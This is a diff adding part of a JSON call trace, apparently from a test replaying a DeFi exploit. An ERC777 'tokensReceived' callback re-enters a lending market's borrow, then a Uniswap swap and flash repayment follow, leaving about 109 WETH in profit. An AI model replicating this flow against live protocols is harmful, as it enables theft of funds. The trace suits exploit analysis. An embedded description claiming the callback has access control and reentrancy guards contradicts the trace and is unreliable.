+                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a",
+                                "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "42622",
+                                "contract": "ContractTest",
+                                "function": "tokensReceived",
+                                "args": "0xa9059cbb, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6, 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25], 0x, 0x",
+                                "original_code": "    function tokensReceived(\n",
+                                "description": "1. Core functions:\n   The `tokensReceived` function is designed to handle the receipt of tokens by a contract. It acts as a callback that gets triggered when tokens are sent to the contract. This function is typically used in contracts that need to react to incoming token transfers, such as updating internal balances, triggering events, or performing other actions based on the received tokens.\n\n2. Security mechanism:\n   - **Access Control**: The function may include modifiers like `onlyOwner` or `onlyAuthorized` to ensure that only specific addresses or roles can call it. This prevents unauthorized access.\n   - **Reentrancy Guard**: To avoid reentrancy attacks, the function might use a reentrancy guard modifier (`nonReentrant`) to ensure that the function cannot be called again before the current execution is complete.\n   - **Input Validation**: The function may validate the input parameters to ensure they are within expected ranges or formats, preventing malicious or erroneous inputs from causing issues.\n\n3. Parameter Function:\n   - **`from`**: This parameter represents the address from which the tokens are being sent. It helps identify the sender of the tokens.\n   - **`amount`**: This parameter indicates the quantity of tokens being received. It is used to update the contract's internal state or perform calculations based on the received amount.\n   - **`data`**: This optional parameter can contain additional information or instructions related to the token transfer. It allows for more complex interactions or custom logic to be executed based on the data provided.\n\n4. Return description:\n   The function typically does not return any value (void). Instead, it performs internal actions such as updating balances, emitting events, or triggering other functions based on the received tokens. The absence of a return value indicates that the function's primary purpose is to handle the token receipt and execute associated logic rather than compute and return a result.\n\nIn summary, the `tokensReceived` function is a callback that processes incoming token transfers, ensuring secure and controlled handling of tokens through access control, reentrancy guards, and input validation. It uses parameters to identify the sender, the amount of tokens, and any additional data, and it performs internal actions without returning a value.",
+                                "return_value": "Returned",
+                                "depth": 6,
+                                "internal_calls": [
+                                  {
+                                    "id": "39880",
+                                    "contract": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                    "function": "borrow",
+                                    "value": null,
+                                    "args": "354000000000000000000 [3.54e20]",
+                                    "return_value": "0",
+                                    "depth": 7,
+                                    "internal_calls": [
+                                      {
+                                        "id": "22074",
+                                        "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                                        "function": "borrowAllowed",
+                                        "value": null,
+                                        "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20]",
+                                        "return_value": "0",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "21394",
+                                            "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                                            "function": "borrowAllowed",
+                                            "value": null,
+                                            "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20]",
+                                            "return_value": "0",
+                                            "depth": 9,
+                                            "internal_calls": [
+                                              {
+                                                "id": "901",
+                                                "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                                "function": "getUnderlyingPrice",
+                                                "value": null,
+                                                "args": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                                "return_value": "1000000000000000000 [1e18]",
+                                                "depth": 10,
+                                                "internal_calls": []
+                                              },
+                                              {
+                                                "id": "3427",
+                                                "contract": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                                "function": "getAccountSnapshot",
+                                                "value": null,
+                                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                                "return_value": "0, 2417223613775 [2.417e12], 1000000000000000000 [1e18], 206848881150465064906976491 [2.068e26]",
+                                                "depth": 10,
+                                                "internal_calls": []
+                                              },
+                                              {
+                                                "id": "901",
+                                                "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                                "function": "getUnderlyingPrice",
+                                                "value": null,
+                                                "args": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                                "return_value": "1000000000000000000 [1e18]",
+                                                "depth": 10,
+                                                "internal_calls": []
+                                              },
+                                              {
+                                                "id": "6051",
+                                                "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                                "function": "getAccountSnapshot",
+                                                "value": null,
+                                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                                "return_value": "0, 0, 0, 200197219122908640304245949 [2.001e26]",
+                                                "depth": 10,
+                                                "internal_calls": [
+                                                  {
+                                                    "id": "4548",
+                                                    "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                                    "function": "delegateToImplementation",
+                                                    "value": null,
+                                                    "args": "0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496",
+                                                    "return_value": "0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a59968feb3c75c20d52cbd",
+                                                    "depth": 11,
+                                                    "internal_calls": [
+                                                      {
+                                                        "id": "2663",
+                                                        "contract": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+                                                        "function": "getAccountSnapshot",
+                                                        "value": null,
+                                                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                                        "return_value": "0, 0, 0, 200197219122908640304245949 [2.001e26]",
+                                                        "depth": 12,
+                                                        "internal_calls": []
+                                                      }
+                                                    ]
+                                                  }
+                                                ]
+                                              }
+                                            ]
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "55",
+                                        "contract": "ContractTest",
+                                        "function": "receive",
+                                        "value": "value: 354000000000000000000",
+                                        "args": "",
+                                        "return_value": "Returned",
+                                        "depth": 8,
+                                        "internal_calls": []
+                                      },
+                                      {
+                                        "id": "949",
+                                        "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                                        "function": "borrowVerify",
+                                        "value": null,
+                                        "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20]",
+                                        "return_value": "Returned",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "342",
+                                            "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                                            "function": "borrowVerify",
+                                            "value": null,
+                                            "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354000000000000000000 [3.54e20]",
+                                            "return_value": "Returned",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      }
+                                    ]
+                                  }
+                                ]
+                              }
+                            ]
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "21974",
+                    "contract": "wETH",
+                    "function": "deposit",
+                    "value": "value: 355000000000000000000",
+                    "args": "",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "26922",
+                    "contract": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                    "function": "approve",
+                    "value": null,
+                    "args": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 19480000000000000000000000000 [1.948e28]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "95918",
+                    "contract": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+                    "function": "swapExactTokensForTokens",
+                    "value": null,
+                    "args": "19480000000000000000000000 [1.948e25], 1, [0xfF20817765cB7f73d4bde2e66e067E58D11095C2, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1630302276 [1.63e9]",
+                    "return_value": "[19480000000000000000000000 [1.948e25], 256168087922212625919 [2.561e20]]",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "2504",
+                        "contract": "0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293",
+                        "function": "getReserves",
+                        "value": null,
+                        "args": "",
+                        "return_value": "975018292290218898234 [9.75e20], 54500123291644810090649509 [5.45e25], 1630302266 [1.63e9]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "42579",
+                        "contract": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                        "function": "transferFrom",
+                        "value": null,
+                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, 19480000000000000000000000 [1.948e25]",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "2942",
+                            "contract": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+                            "function": "getInterfaceImplementer",
+                            "value": null,
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4",
+                            "return_value": "0x0000000000000000000000000000000000000000",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2942",
+                            "contract": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+                            "function": "getInterfaceImplementer",
+                            "value": null,
+                            "args": "0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293, 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a",
+                            "return_value": "0x0000000000000000000000000000000000000000",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "40516",
+                        "contract": "0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293",
+                        "function": "swap",
+                        "value": null,
+                        "args": "256168087922212625919 [2.561e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "8062",
+                            "contract": "wETH",
+                            "function": "transfer",
+                            "value": null,
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 256168087922212625919 [2.561e20]",
+                            "return_value": "true",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "534",
+                            "contract": "wETH",
+                            "function": "balanceOf",
+                            "value": null,
+                            "args": "0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293",
+                            "return_value": "718850204368006272315 [7.188e20]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "597",
+                            "contract": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                            "function": "balanceOf",
+                            "value": null,
+                            "args": "0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293",
+                            "return_value": "73980123291644810090649509 [7.398e25]",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "3262",
+                    "contract": "wETH",
+                    "function": "transfer",
+                    "value": null,
+                    "args": "0xd3d2E2692501A5c9Ca623199D38826e513033a17, 502000000000000000000 [5.02e20]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "wETH",
+                    "function": "balanceOf",
+                    "value": null,
+                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "return_value": "109168087922212625919 [1.091e20]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "25162",
+                    "contract": "wETH",
+                    "function": "transfer",
+                    "value": null,
+                    "args": "DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 109168087922212625919 [1.091e20]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "2797",
+                "contract": "UNI",
+                "function": "balanceOf",
+                "value": null,
+                "args": "0xd3d2E2692501A5c9Ca623199D38826e513033a17",
+                "return_value": "1992277665188069083236236 [1.992e24]",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "534",
+                "contract": "wETH",
+                "function": "balanceOf",
+                "value": null,
+                "args": "0xd3d2E2692501A5c9Ca623199D38826e513033a17",
+                "return_value": "16476245727715211844381 [1.647e22]",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "534",
+            "contract": "wETH",
+            "function": "balanceOf",
+            "value": null,
+            "args": "DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]",
+            "return_value": "109168087922212625919 [1.091e20]",
+            "depth": 1,
+            "internal_calls": []
+          }
+        ]
+      }
+    ]
+  }
+}
